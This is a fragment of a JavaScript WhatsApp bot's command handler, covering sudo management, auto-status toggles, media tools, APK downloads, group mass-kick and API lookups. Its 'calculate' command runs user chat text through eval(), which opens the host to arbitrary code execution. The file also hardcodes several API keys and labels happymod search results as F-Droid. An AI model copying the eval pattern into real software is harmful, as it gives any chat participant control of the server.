    saveSudoList(updatedList);

    reply(`✅ @${number} *removed from sudo list*`);
}
break;

case 'getsudo': case 'listsudo': {
    if (!isCreator && !isSudo) 
        return reply('🔒 *Owner/Sudo only*');
    
    const sudoList = loadSudoList();
    if (sudoList.length === 0) 
        return reply('📭 *Sudo list is empty*');

    const suCYBERumbers = sudoList.map((jid) => jid.split('@')[0]).join('\n• ');
    reply(`👥 *Sudo List*\n\n• ${suCYBERumbers}`);
}
break;

case "autobio": {
    if (!isCreator && !isSudo) 
        return reply('🔒 *Owner/Sudo only*');
    
    if (!args[0]) return reply("⚙️ *Usage:* autobio on/off");
    
    if (args[0].toLowerCase() === "on") {
        setSetting(m.sender, "autobio", true);
        reply("✅ *Auto bio enabled* • Status will update automatically");
    } else if (args[0].toLowerCase() === "off") {
        setSetting(m.sender, "autobio", false);
        reply("❌ *Auto bio disabled*");
    } else reply("⚙️ *Usage:* autobio on/off");
}
break;

case "autoread": {
    if (!isCreator && !isSudo) 
        return reply('🔒 *Owner/Sudo only*');
    
    if (!args[0]) return reply("⚙️ *Usage:* autoread on/off");
    
    if (args[0].toLowerCase() === "on") {
        setSetting(m.sender, "autoread", true);
        reply("✅ *Auto read enabled* • Messages auto-read");
    } else if (args[0].toLowerCase() === "off") {
        setSetting(m.sender, "autoread", false);
        reply("❌ *Auto read disabled*");
    } else reply("⚙️ *Usage:* autoread on/off");
}
break;

case "autoviewstatus": {
    if (!isCreator && !isSudo) 
        return reply('🔒 *Owner/Sudo only*');
    
    if (!args[0]) return reply("⚙️ *Usage:* autoviewstatus on/off");
    
    if (args[0].toLowerCase() === "on") {
        setSetting(botNumber, "autoViewStatus", true);
        reply("✅ *Auto view status enabled* • Stories auto-viewed");
    } else if (args[0].toLowerCase() === "off") {
        setSetting(botNumber, "autoViewStatus", false);
        reply("❌ *Auto view status disabled*");
    } else reply("⚙️ *Usage:* autoviewstatus on/off");
}
break;

case "autostatusreact": {
    if (!isCreator && !isSudo) return reply('🔒 *Owner/Sudo only*');
    if (!args[0]) return reply("⚙️ *Usage:* autostatusreact on/off\n\nAuto reacts to statuses with random emojis.");
    if (args[0].toLowerCase() === "on") {
        setSetting(botNumber, "autoStatusReact", true);
        reply("✅ *Auto status react enabled* • Will react to statuses with random emojis");
    } else if (args[0].toLowerCase() === "off") {
        setSetting(botNumber, "autoStatusReact", false);
        reply("❌ *Auto status react disabled*");
    } else reply("⚙️ *Usage:* autostatusreact on/off");
}
break;

case "autostatusreply": {
    if (!isCreator && !isSudo) return reply('🔒 *Owner/Sudo only*');
    if (!args[0]) return reply("⚙️ *Usage:* autostatusreply on/off [message]\n\nExample: autostatusreply on Nice status! 🔥");
    if (args[0].toLowerCase() === "on") {
        const _replyMsg = args.slice(1).join(' ').trim() || '👀 Seen!';
        setSetting(botNumber, "autoStatusReply", true);
        setSetting(botNumber, "autoStatusReplyMsg", _replyMsg);
        reply(`✅ *Auto status reply enabled*\n\n📝 *Reply message:* ${_replyMsg}`);
    } else if (args[0].toLowerCase() === "off") {
        setSetting(botNumber, "autoStatusReply", false);
        reply("❌ *Auto status reply disabled*");
    } else reply("⚙️ *Usage:* autostatusreply on/off [message]");
}
break;

case "autotyping": {
    if (!isCreator && !isSudo) 
        return reply('🔒 *Owner/Sudo only*');
    
    if (!args[0]) return reply("⚙️ *Usage:* autotyping on/off");
    if (!m.isGroup) return reply("👥 *Groups only*");

    if (args[0].toLowerCase() === "on") {
        setSetting(m.chat, "autoTyping", true);
        reply("✅ *Auto typing enabled* • Bot shows typing");
    } else if (args[0].toLowerCase() === "off") {
        setSetting(m.chat, "autoTyping", false);
        reply("❌ *Auto typing disabled*");
    } else reply("⚙️ *Usage:* autotyping on/off");
}
break;

case "autorecording": {
    if (!isCreator && !isSudo) 
        return reply('🔒 *Owner/Sudo only*');
    
    if (!args[0]) return reply("⚙️ *Usage:* autorecording on/off");
    if (!m.isGroup) return reply("👥 *Groups only*");

    if (args[0].toLowerCase() === "on") {
        setSetting(m.chat, "autoRecording", true);
        reply("✅ *Auto recording enabled* • Bot shows recording");
    } else if (args[0].toLowerCase() === "off") {
        setSetting(m.chat, "autoRecording", false);
        reply("❌ *Auto recording disabled*");
    } else reply("⚙️ *Usage:* autorecording on/off");
}
break;

case "autorecordtype": {
    if (!isAdmins && !isCreator) 
        return reply('🔒 *Admins/Owner only*');
    
    if (!args[0]) return reply("⚙️ *Usage:* autorecordtype on/off");
    if (!m.isGroup) return reply("👥 *Groups only*");

    if (args[0].toLowerCase() === "on") {
        setSetting(m.chat, "autoRecordType", true);
        reply("✅ *Auto record type enabled* • Random typing/recording");
    } else if (args[0].toLowerCase() === "off") {
        setSetting(m.chat, "autoRecordType", false);
        reply("❌ *Auto record type disabled*");
    } else reply("⚙️ *Usage:* autorecordtype on/off");
}
break;

case "autoreact": {
    if (!isAdmins && !isCreator) 
        return reply('🔒 *Admins/Owner only*');
    
    if (!args[0]) return reply("⚙️ *Usage:* autoreact on/off");
    if (!m.isGroup) return reply("👥 *Groups only*");

    if (args[0].toLowerCase() === "on") {
        setSetting(m.chat, "autoReact", true);
        reply("✅ *Auto react enabled* • Messages get random reactions");
    } else if (args[0].toLowerCase() === "off") {
        setSetting(m.chat, "autoReact", false);
        reply("❌ *Auto react disabled*");
    } else reply("⚙️ *Usage:* autoreact on/off");
}
break;

case "ban": {
    if (!isCreator) return reply('🔒 *Owner only*');
    
    if (!args[0]) return reply("⚙️ *Usage:* ban @user");
    
    let user = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    setSetting(user, "banned", true);
    reply(`🚫 @${user.split("@")[0]} *banned*`, [user]);
}
break;

case "unban": {
    if (!isCreator) return reply('🔒 *Owner only*');
    
    if (!args[0]) return reply("⚙️ *Usage:* unban @user");
    
    let user = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    setSetting(user, "banned", false);
    reply(`✅ @${user.split("@")[0]} *unbanned*`, [user]);
}
break;

case "autoreply": {
    if (!isCreator) return reply('🔒 *Owner only*');
    
    if (!args[0]) return reply("⚙️ *Usage:* autoreply on/off");
    
    if (args[0].toLowerCase() === "on") {
        setSetting(m.chat, "feature.autoreply", true);
        reply("✅ *Auto reply enabled* • Bot responds to keywords");
    } else if (args[0].toLowerCase() === "off") {
        setSetting(m.chat, "feature.autoreply", false);
        reply("❌ *Auto reply disabled*");
    } else reply("⚙️ *Usage:* autoreply on/off");
}
break;

case "antibadword": {
    if (!isCreator && !isSudo) 
        return reply('🔒 *Owner/Sudo only*');
    
    if (!args[0]) return reply("⚙️ *Usage:* antibadword on/off");
    
    if (args[0].toLowerCase() === "on") {
        setSetting(m.chat, "feature.antibadword", true);
        reply("✅ *Anti bad word enabled* • Bad words filtered");
    } else if (args[0].toLowerCase() === "off") {
        setSetting(m.chat, "feature.antibadword", false);
        reply("❌ *Anti bad word disabled*");
    } else reply("⚙️ *Usage:* antibadword on/off");
}
break;

case "antibot": {
    if (!isCreator && !isSudo) 
        return reply('🔒 *Owner/Sudo only*');
    
    if (!args[0]) return reply("⚙️ *Usage:* antibot on/off");
    
    if (args[0].toLowerCase() === "on") {
        setSetting(m.chat, "feature.antibot", true);
        reply("✅ *Anti bot enabled* • Bot prefixes blocked");
    } else if (args[0].toLowerCase() === "off") {
        setSetting(m.chat, "feature.antibot", false);
        reply("❌ *Anti bot disabled*");
    } else reply("⚙️ *Usage:* antibot on/off");
}
break;

case "owner": {
    const ownerName = "*NIZAMANI*";
    const ownerNumber = "923417022212";
    const displayTag = "GAME CHANGER";

    let vcard = `BEGIN:VCARD
VERSION:3.0
FN:${ownerName}
TEL;type=CELL;type=VOICE;waid=${ownerNumber}:+${ownerNumber}
END:VCARD`;

    let caption = `👑 *CYBER Owner*\n\n📱 wa.me/${ownerNumber}\n💬 DM for support/requests`;

    await devtrust.sendMessage(m.chat, { 
        contacts: { displayName: displayTag, contacts: [{ vcard }] } 
    }, { quoted: m });

    await devtrust.sendMessage(m.chat, 
        addNewsletterContext({
            text: caption,
            mentions: [m.sender]
        }), 
        { quoted: m }
    );
}
break;

case "repo": {
    const waChannel  = "https://whatsapp.com/channel/0029VbC0knY72WU0QUNAid3B";

    let caption = `📂 *CYBER Repository*\n\n` +
        `📢 Updates:\n${waChannel}`;

    await devtrust.sendMessage(m.chat, 
        addNewsletterContext({
            text: caption,
            mentions: [m.sender]
        }), 
        { quoted: m }
    );
}
break;

case 'url':
case 'tourl': {    
    let q = m.quoted ? m.quoted : m;
    if (!q || !q.download) return reply(`🖼️ *Reply to an image/video* with ${prefix + command}`);
    
    let mime = q.mimetype || '';
    if (!/image\/(png|jpe?g|gif)|video\/mp4/.test(mime)) {
        return reply('❌ *Only images/MP4 supported*');
    }

    let media;
    try {
        media = await q.download();
    } catch (error) {
        return reply('❌ *Download failed*');
    }

    const uploadImage = require('./allfunc/Data6');
    const uploadFile = require('./allfunc/Data7');

    let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime);
    let link;
    try {
        link = await (isTele ? uploadImage : uploadFile)(media);
    } catch (error) {
        return reply('❌ *Upload failed*');
    }

    reply(`✅ *Uploaded*\n${link}`);
}
break;  // ← 'url' case ENDS here

// ============ UPLOAD TO CATBOX FUNCTION ============
// This goes HERE - between cases, available to ALL commands
// ============ UPLOAD TO CATBOX FUNCTION ============
async function uploadToCatbox(buffer) {
    const FormData = require('form-data');
    
    // Create temp directory if it doesn't exist
    if (!fs.existsSync('./tmp')) {
        fs.mkdirSync('./tmp', { recursive: true });
    }
    
    const tempFile = './tmp/upload_' + Date.now() + '.jpg';
    let result = null;
    
    try {
        // Write buffer to temp file
        fs.writeFileSync(tempFile, buffer);
        
        // Try Catbox first
        try {
            const formData = new FormData();
            formData.append('fileToUpload', fs.createReadStream(tempFile));
            formData.append('reqtype', 'fileupload');
            
            const response = await axios.post('https://catbox.moe/user/api.php', formData, {
                headers: {
                    ...formData.getHeaders(),
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                },
                maxContentLength: Infinity,
                maxBodyLength: Infinity,
                timeout: 30000
            });
            
            if (response.data && response.data.startsWith('https://')) {
                result = response.data;
                console.log('✅ Catbox upload successful');
            }
        } catch (catboxError) {
            console.log('Catbox failed, trying Telegraph...');
        }
        
        // If Catbox failed, try Telegraph
        if (!result) {
            try {
                const telegraphResponse = await axios.post('https://telegra.ph/upload', buffer, {
                    headers: {
                        'Content-Type': 'image/jpeg'
                    },
                    timeout: 30000
                });
                
                if (telegraphResponse.data && 
                    telegraphResponse.data[0] && 
                    telegraphResponse.data[0].src) {
                    result = 'https://telegra.ph' + telegraphResponse.data[0].src;
                    console.log('✅ Telegraph upload successful');
                }
            } catch (telegraphError) {
                console.log('Telegraph failed too');
            }
        }
        
        // If both failed, try one more service
        if (!result) {
            try {
                // Convert buffer to base64
                const base64 = buffer.toString('base64');
                const imgbbResponse = await axios.post('https://api.imgbb.com/1/upload', {
                    key: 'f2cc2bc5b9d7e9e8b7a5d4a3c2b1e0f9', // Public demo key - rate limited
                    image: base64
                }, { timeout: 30000 });
                
                if (imgbbResponse.data && 
                    imgbbResponse.data.data && 
                    imgbbResponse.data.data.url) {
                    result = imgbbResponse.data.data.url;
                    console.log('✅ ImgBB upload successful');
                }
            } catch (imgbbError) {
                console.log('All upload services failed');
            }
        }
        
        // Clean up temp file
        try { fs.unlinkSync(tempFile); } catch (e) {}
        
        if (!result) {
            throw new Error('All upload services failed');
        }
        
        return result;
        
    } catch (error) {
        console.error('Upload error:', error);
        // Clean up temp file if it exists
        try { 
            if (fs.existsSync(tempFile)) {
                fs.unlinkSync(tempFile); 
            }
        } catch (e) {}
        throw error;
    }
}
// ====================================================
// ====================================================

// Now 'removebg' can use the function above
case "removebg": {
    // Check if there's a quoted message
    if (!m.quoted) {
        return await reply("🖼️ *Reply to an image with .removebg*\nExample: Reply to any image and type .removebg");
    }
    
    // Get the quoted message
    const quotedMsg = m.quoted;
    
    // Check if it's an image
    const mime = (quotedMsg.msg || quotedMsg).mimetype || '';
    const isImage = /image\/(png|jpe?g|gif|webp)/.test(mime);
    
    if (!isImage) {
        return await reply("❌ *That's not an image.* Reply to a JPG/PNG image.");
    }

    try {
        await devtrust.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
        
        await reply(`🔍 *Removing background...*`);
        
        // Download the image
        let media = await quotedMsg.download();
        
        // Upload to temporary hosting
        let uploadedUrl = await uploadToCatbox(media);
        
        if (!uploadedUrl) {
            throw new Error('Upload failed');
        }
        
        // Call removebg API
        let response = await fetch(`https://apis.prexzyvilla.site/imagecreator/removebg?url=${encodeURIComponent(uploadedUrl)}`);
        let data = await response.json();

        if (data.status && data.data) {
            await devtrust.sendMessage(m.chat,
                addNewsletterContext({
                    image: { url: data.data },
                    caption: "✨ *Background Removed*"
                }),
                { quoted: m }
            );
            await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        } else {
            throw new Error('API returned error');
        }
    } catch (e) {
        console.error('RemoveBG error:', e);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        await reply("⚠️ *Failed to remove background.* The service might be down. Try again later.");
    }
}
break;

case 'tiktok':
case 'tt': {
    if (!text) {
        return reply(`🎵 *Usage:* ${prefix + command} link`);
    }
    if (!text.includes('tiktok.com')) {
        return reply(`❌ *Invalid TikTok link*`);
    }
    
    m.reply("*⏳ Fetching video...*");

    const tiktokApiUrl = `https://api.bk9.dev/download/tiktok?url=${encodeURIComponent(text)}`;

    fetch(tiktokApiUrl)
        .then(response => response.json())
        .then(data => {
            if (!data.status || !data.BK9 || !data.BK9.BK9) {
                return reply('❌ *Failed to get download link*');
            }
            
            const videoUrl = data.BK9.BK9;
            
            devtrust.sendMessage(m.chat, 
                addNewsletterContext({
                    video: { url: videoUrl },
                    caption: "🎵 *CYBER TikTok*"
                }), 
                { quoted: m }
            );
        })
        .catch(err => {
            console.error(err);
            reply("❌ *Download failed* • Network error");
        });
}
break;

case 'apk':
case 'apkdl': {
    if (!text) return reply(`📱 *APK Search & Download*\n\nUsage: ${prefix + command} [app name]\nExample: ${prefix + command} WhatsApp`);

    await devtrust.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
    try {
        const searchRes = await axios.get(`https://api.princetechn.com/api/search/happymod?apikey=prince&query=${encodeURIComponent(text.trim())}`, { timeout: 20000 });
        const sData = searchRes.data;

        if (!sData.success || !sData.results?.data?.length) {
            await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
            return reply(`❌ *"${text}"* ke liye koi app nahi mila. Koi aur naam try karo.`);
        }

        const apps = sData.results.data.slice(0, 8);
        const menuText = apps.map((a, i) =>
            `*${i + 1}.* ${a.name}\n    📝 ${(a.summary || '').substring(0, 55)}`
        ).join('\n\n');

        const sentMsg = await devtrust.sendMessage(m.chat,
            addNewsletterContext({
                image: { url: apps[0].icon },
                caption: `📱 *APK Search Results*\n🔎 Query: *${text}*\n📦 Source: F-Droid (Free & Open Source)\n\n${menuText}\n\n📌 *Number reply karo download ke liye*`
            }),
            { quoted: m }
        );

        const _apkHandler = async (msgUpdate) => {
            try {
                const msg = msgUpdate?.messages[0];
                if (!msg?.message) return;
                const replyTxt = (msg.message.extendedTextMessage?.text || msg.message.conversation || '').trim();
                const stanzaId = msg.message.extendedTextMessage?.contextInfo?.stanzaId;
                if (stanzaId !== sentMsg?.key?.id) return;

                const num = parseInt(replyTxt);
                if (isNaN(num) || num < 1 || num > apps.length) return;

                devtrust.ev.off('messages.upsert', _apkHandler);
                await devtrust.sendMessage(m.chat, { react: { text: '⏳', key: msg.key } });

                const chosen = apps[num - 1];
                // Extract package ID from F-Droid URL
                const pkgId = chosen.url.split('/packages/')[1]?.split('/')[0];

                await devtrust.sendMessage(m.chat, { text: `⬇️ *${chosen.name}*\nDownload preparing...` }, { quoted: msg });

                // Get APK download URL from F-Droid API
                const fdRes = await axios.get(`https://f-droid.org/api/v1/packages/${pkgId}/suggested`, { timeout: 15000 });
                const fdData = fdRes.data;

                if (!fdData || !fdData.apkName) throw new Error('APK download link nahi mila');

                const apkUrl = `https://f-droid.org/repo/${fdData.apkName}`;
                const apkBuf = Buffer.from((await axios.get(apkUrl, {
                    responseType: 'arraybuffer',
                    headers: { 'User-Agent': 'Mozilla/5.0' },
                    timeout: 180000,
                    maxContentLength: 200 * 1024 * 1024
                })).data);

                if (chosen.icon) {
                    await devtrust.sendMessage(m.chat, addNewsletterContext({
                        image: { url: chosen.icon },
                        caption: `📦 *${chosen.name}*\n📝 ${chosen.summary || ''}\n🆔 Package: ${pkgId}`
                    }), { quoted: msg });
                }

                await devtrust.sendMessage(m.chat, {
                    document: apkBuf,
                    fileName: `${chosen.name.replace(/[<>:"/\\|?*]+/g, '').substring(0, 50)}.apk`,
                    mimetype: 'application/vnd.android.package-archive',
                    caption: `✅ *${chosen.name}*`
                }, { quoted: msg });

                await devtrust.sendMessage(m.chat, { react: { text: '✅', key: msg.key } });

            } catch (e) {
                console.error('apk handler error:', e.message);
                await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
                reply(`❌ *APK download failed:* ${e.message}`);
            }
        };

        devtrust.ev.on('messages.upsert', _apkHandler);
        setTimeout(() => devtrust.ev.off('messages.upsert', _apkHandler), 120000);

    } catch (e) {
        console.error('apk search error:', e.message);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        reply(`❌ *APK Search failed:* ${e.message}`);
    }
}
break;

case 'tomp4': {
    if (!m.quoted) return reply("🖼️ *Reply to a sticker/gif* with tomp4");
    let mime = m.quoted.mimetype || '';
    if (!/webp|gif/.test(mime)) return reply("⚠️ *Reply must be a sticker or gif*");

    try {
        let media = await m.quoted.download();
        let inputPath = `./tmp/${Date.now()}.${mime.includes('gif') ? 'gif' : 'webp'}`;
        let outputPath = `./tmp/${Date.now()}.mp4`;
        
        if (!fs.existsSync('./tmp')) fs.mkdirSync('./tmp', { recursive: true });
        
        fs.writeFileSync(inputPath, media);
        
        // Simple conversion command
        exec(`ffmpeg -i ${inputPath} -c:v libx264 -pix_fmt yuv420p ${outputPath}`, async (err) => {
            if (err) {
                console.log(err);
                return reply("❌ *Conversion failed*");
            }
            
            let converted = fs.readFileSync(outputPath);
            await devtrust.sendMessage(m.chat, 
                addNewsletterContext({
                    video: converted,
                    mimetype: 'video/mp4',
                    caption: "🎬 *Converted to MP4*"
                }), 
                { quoted: m }
            );
            
            try { 
                fs.unlinkSync(inputPath); 
                fs.unlinkSync(outputPath); 
            } catch (e) {}
        });
        
    } catch (e) {
        console.log(e);
        reply("❌ *Conversion failed*");
    }
}
break;

case 'tomp3': {
    if (!m.quoted) return reply("🎥 *Reply to a video* with tomp3");
    let mime = m.quoted.mimetype || '';
    if (!/video/.test(mime)) return reply("⚠️ *Reply to a video only*");

    try {
        let media = await devtrust.downloadMediaMessage(m.quoted);
        
        await devtrust.sendMessage(m.chat, 
            addNewsletterContext({
                audio: media,
                mimetype: 'audio/mpeg'
            }), 
            { quoted: m }
        );
    } catch (e) {
        console.log(e);
        reply("❌ *Conversion failed*");
    }
}
break;

case 'kickadmins': {
    if (!m.isGroup) return reply(m.group);
    if (!isCreator && !isSudo) 
        return reply('🔒 *Owner/Sudo only*');

    let metadata = await devtrust.groupMetadata(m.chat);
    let participants = metadata.participants;
    let kicked = 0;

    for (let member of participants) {
        if (member.id === botNumber) continue;
        if (member.id === m.sender) continue;

        if (member.admin === "superadmin" || member.admin === "admin") {
            await devtrust.groupParticipantsUpdate(m.chat, [member.id], 'remove');
            kicked++;
            await sleep(1500);
        }
    }

    reply(`✅ *${kicked} admins removed*`);
}
break;

case 'kickall': {
    if (!m.isGroup) return reply(m.group);
    if (!isCreator && !isSudo) 
        return reply('🔒 *Owner/Sudo only*');

    let metadata = await devtrust.groupMetadata(m.chat);
    let participants = metadata.participants;
    let kicked = 0;

    for (let member of participants) {
        if (member.id === botNumber) continue;
        if (member.admin === "superadmin" || member.admin === "admin") continue;

        await devtrust.groupParticipantsUpdate(m.chat, [member.id], 'remove');
        kicked++;
        await sleep(1500);
    }

    reply(`✅ *${kicked} members removed*`);
}
break;

case 'coffee': {
    devtrust.sendMessage(m.chat, 
        addNewsletterContext({
            image: { url: 'https://coffee.alexflipnote.dev/random' },
            caption: "☕ *Fresh coffee just for you*"
        }), 
        { quoted: m }
    );
}
break;

case 'myip': {
    if (!isCreator) return reply("🔒 *Owner only*");
    
    try {
        var http = require('http');
        http.get({
            'host': 'api.ipify.org',
            'port': 80,
            'path': '/'
        }, function(resp) {
            let ipData = '';
            resp.on('data', function(chunk) {
                ipData += chunk;
            });
            resp.on('end', function() {
                reply(`🌐 *Your IP Address:*\n\`${ipData}\``);
            });
        }).on('error', function(e) {
            reply(`❌ *Error fetching IP:* ${e.message}`);
        });
    } catch (e) {
        reply(`❌ *Error:* ${e.message}`);
    }
    break;
}

case "movie": {
    if (!text) return reply("🎬 *Example:* movie Inception");

    await devtrust.sendPresenceUpdate("composing", m.chat);

    try {
        const res = await axios.get(`http://www.omdbapi.com/?t=${encodeURIComponent(text)}&apikey=6372bb60`);
        if (res.data.Response === "False") return reply("❌ *Movie not found*");

        const data = res.data;

        let caption = `🎬 *${data.Title}*\n\n` +
            `📅 ${data.Year} • ⭐ ${data.imdbRating}\n` +
            `🎭 ${data.Genre}\n\n` +
            `📝 ${data.Plot.substring(0, 200)}...\n\n` +
            `👤 ${data.Director}`;

        await devtrust.sendMessage(m.chat, 
            addNewsletterContext({
                image: { url: data.Poster !== "N/A" ? data.Poster : "https://i.ibb.co/4f4tTnG/no-poster.png" },
                caption: caption
            }), 
            { quoted: m }
        );
    } catch (e) {
        console.error(e);
        reply("⚠️ *Movie info unavailable* • Try again later");
    }
}
break;

case "sciencefact": {
    try {
        const res = await axios.get("https://uselessfacts.jsph.pl/random.json?language=en");
        reply(`🔬 *Science Fact*\n\n${res.data.text}`);
    } catch {
        reply("❌ *Fact machine broke* • Try again later");
    }
}
break;

case "book": {
    if (!text) return reply("📚 *Example:* book Harry Potter");
    
    try {
        const res = await axios.get(`https://openlibrary.org/search.json?q=${encodeURIComponent(text)}&limit=3`);
        if (!res.data.docs.length) return reply("❌ *No books found*");
        
        const books = res.data.docs.map((b,i) => 
            `${i+1}. *${b.title}*\n👤 ${b.author_name?.[0] || "Unknown"}`
        ).join("\n\n");
        
        reply(`📚 *Book Search*\n\n${books}`);
    } catch {
        reply("❌ *Search failed* • Library is closed");
    }
}
break;

case "recipe": {
    if (!text) return reply("🍳 *Example:* recipe pancakes");
    
    try {
        const res = await axios.get(`https://www.themealdb.com/api/json/v1/1/search.php?s=${encodeURIComponent(text)}`);
        if (!res.data.meals) return reply("❌ *No recipes found*");
        
        const meal = res.data.meals[0];
        const ingredients = Array.from({length:20})
            .map((_,i) => meal[`strIngredient${i+1}`] ? `• ${meal[`strIngredient${i+1}`]} - ${meal[`strMeasure${i+1}`]}` : '')
            .filter(Boolean)
            .join("\n");
        
        const msg = `🍽 *${meal.strMeal}*\n\n${ingredients}`;
        reply(msg);
    } catch {
        reply("❌ *Recipe fetch failed* • Kitchen's closed");
    }
}
break;

case "remind": {
    if (!text) return reply("⏰ *Usage:* remind 60 Take a break");
    
    const [sec, ...msgArr] = text.split(" ");
    const msgText = msgArr.join(" ");
    const delay = parseInt(sec) * 1000;
    
    if (isNaN(delay) || !msgText) return reply("❌ *Invalid format*");
    
    reply(`⏰ *Reminder set* for ${sec} seconds`);
    
    setTimeout(() => {
        devtrust.sendMessage(m.chat, { text: `⏰ *Reminder:* ${msgText}` });
    }, delay);
}
break;

case "define":
case "dictionary": {
    if (!text) return reply("📖 *Example:* define computer");
    
    try {
        const res = await axios.get(`https://api.dictionaryapi.dev/api/v2/entries/en/${text}`);
        const meanings = res.data[0].meanings[0].definitions[0].definition;
        reply(`📖 *${text}*\n\n${meanings}`);
    } catch {
        reply("❌ *Word not found*");
    }
}
break;

case "currencies":
case "currency": {
    if (!text) {
        return reply(`💱 *CYBER Currency*\n\nUsage: ${prefix}currency [amount] [from] [to]\nExample: ${prefix}currency 100 USD EUR\n\nOr use: ${prefix}currencies to see all available codes`);
    }
    
    const [amount, from, to] = text.split(" ");
    
    // If all three arguments provided, do conversion
    if (amount && from && to) {
        try {
            await devtrust.sendMessage(m.chat, { react: { text: '💱', key: m.key } });
            
            const response = await axios.get(`https://api.exchangerate.host/convert?from=${from.toUpperCase()}&to=${to.toUpperCase()}&amount=${amount}`, {
                timeout: 10000
            });
            
            if (!response.data || !response.data.result) {
                throw new Error('Invalid response');
            }
            
            reply(`💱 *CYBER Currency*\n\n${amount} ${from.toUpperCase()} = ${response.data.result} ${to.toUpperCase()}`);
            await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
            
        } catch (error) {
            console.error('Currency error:', error.message);
            await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
            reply(`⚠️ *CYBER Currency*\n\nExchange rates are sleeping. Try again later.`);
        }
        return;
    }
    
    // If no arguments or just "currencies", show available currencies
    try {
        await devtrust.sendMessage(m.chat, { react: { text: '💱', key: m.key } });
        
        const response = await axios.get('https://apis.davidcyril.name.ng/tools/currencies', {
            timeout: 10000
        });
        
        if (!response.data.success || !response.data.result) {
            throw new Error('API Error');
        }

        let currencyList = `💱 *CYBER Currencies*\n\n`;
        
        response.data.result.slice(0, 30).forEach((curr, i) => {
            currencyList += `${i + 1}. *${curr.code}* - ${curr.name}\n`;
        });
        
        currencyList += `\n_Use ${prefix}currency [amount] [from] [to] to convert_`;
        
        reply(currencyList);
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        
    } catch (err) {
        console.error('Currencies error:', err.message);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        reply(`⚠️ *CYBER Currencies*\n\nCurrency list is on vacation. Try again later.`);
    }
}
break;

case "genpass": {
    const length = parseInt(text) || 12;
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()";
    let pass = "";
    for (let i=0; i<length; i++) 
        pass += chars.charAt(Math.floor(Math.random()*chars.length));
    
    reply(`🔑 *Generated Password*\n\n${pass}`);
}
break;

case "readqr": {
    if (!m.quoted || !m.quoted.image) 
        return reply("📱 *Reply to a QR code image*");
    
    const buffer = await m.quoted.download();
    
    try {
        const res = await axios.post("https://api.qrserver.com/v1/read-qr-code/", buffer, {
            headers: { "Content-Type": "multipart/form-data" }
        });
        const qrText = res.data[0].symbol[0].data;
        reply(`📱 *QR Code Content*\n\n${qrText}`);
    } catch (e) {
        reply("❌ *Failed to read QR code*");
    }
}
break;

case 'weather':
case 'weather2':
case 'weatherinfo': {
    if (!text) return reply(`🌤 *CYBER Weather*\n\nUsage: ${prefix}${command} [city]\nExample: ${prefix}${command} LonCYBER`);
    
    try {
        await devtrust.sendMessage(m.chat, { react: { text: '🌤️', key: m.key } });
        
        reply(`🔍 *CYBER Weather*\n\nChecking forecast for ${text}...`);
        
        const response = await axios.get(
            `https://api.openweathermap.org/data/2.5/weather?q=${encodeURIComponent(text)}&units=metric&appid=d97e458517de3eac6d3c50abcdcbe0e7`,
            { timeout: 10000 }
        );
        
        const data = response.data;
        
        const weatherInfo = `📍 *${data.name}, ${data.sys.country}*\n` +
                           `🌡️ ${data.main.temp}°C (feels like ${data.main.feels_like}°C)\n` +
                           `☁️ ${data.weather[0].description}\n` +
                           `💧 ${data.main.humidity}% humidity\n` +
                           `🌬️ ${data.wind.speed} m/s wind`;
        
        reply(`🌤 *CYBER Weather*\n\n${weatherInfo}`);
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        
    } catch (error) {
        console.error('Weather Error:', error.message);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        reply(`⚠️ *CYBER Weather*\n\nWeather service is offline. Try again later.`);
    }
}
break;

case "calculate": {
    if (!text) return reply("🧮 *Example:* calculate 12+25*3");
    
    try {
        const result = eval(text);
        reply(`🧮 *Result*\n\n${text} = ${result}`);
    } catch {
        reply("❌ *Invalid expression*");
    }
}
break;

case 'wiki':
case 'wikipedia': {
    if (!text) {
        return reply(`📚 *CYBER Wikipedia*\n\nUsage: ${prefix}${command} [search term]\nExample: ${prefix}${command} Albert Einstein`);
    }
    
    try {
        await devtrust.sendMessage(m.chat, { react: { text: '📚', key: m.key } });
        
        reply(`🔍 *CYBER Wikipedia*\n\nSearching: ${text}`);
        
        const response = await axios.get(
            `https://en.wikipedia.org/api/rest_v1/page/summary/${encodeURIComponent(text)}`,
            { timeout: 10000 }
        );
        
        const data = response.data;
        
        // Handle disambiguation pages (multiple results)
        if (data.type === 'disambiguation') {
            return reply(`❌ *CYBER Wikipedia*\n\n"${text}" is too broad. Please be more specific.`);
        }
        
        // Check if extract exists
        if (!data.extract) {
            return reply(`❌ *CYBER Wikipedia*\n\nNo results found for "${text}". Try a different term.`);
        }
        
        // Truncate long extracts
        const extract = data.extract.length > 500 
            ? data.extract.substring(0, 500) + '...' 
            : data.extract;
        
        const info = `📚 *${data.title}*\n\n${extract}\n\n🔗 ${data.content_urls.desktop.page}`;
        
        // Send with thumbnail if available
        if (data.thumbnail) {
            await devtrust.sendMessage(m.chat, 
                addNewsletterContext({
                    image: { url: data.thumbnail.source },
                    caption: info
                }), 
                { quoted: m }
            );
        } else {
            reply(`📚 *CYBER Wikipedia*\n\n${info}`);
        }
        
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        
    } catch (error) {
        console.error('Wiki Error:', error.response?.data || error.message);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        
        if (error.response?.status === 404) {
